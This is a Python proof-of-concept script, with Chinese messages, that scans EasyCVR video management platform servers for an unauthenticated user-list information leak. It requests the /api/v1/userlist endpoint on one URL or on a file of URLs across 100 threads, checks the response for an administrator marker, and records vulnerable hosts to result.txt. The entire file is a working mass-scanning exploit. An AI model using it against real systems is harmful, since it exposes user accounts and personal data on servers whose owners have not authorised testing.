import argparse,requests,sys,json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """EasyCVR 视频管理平台存在用户信息泄露"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="EasyCVR 视频管理平台存在用户信息泄露")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/api/v1/userlist?pageindex=0&pagesize=10"
    res = requests.get(url=target+payload)
    try:
        if res.status_code == 200:
            res1 = requests.get(url=target + payload,verify=False, timeout=5)
            if res1.status_code == 200 and "管理员" in res1.text:
                print(f"[+] {target} 存在信息泄露")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[+] {target} 存在信息泄露\n")
            else:
                print(f"该 {target} 不存在未授权漏洞")
        else:
            print(f"{target}请求失败,请手动检查")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()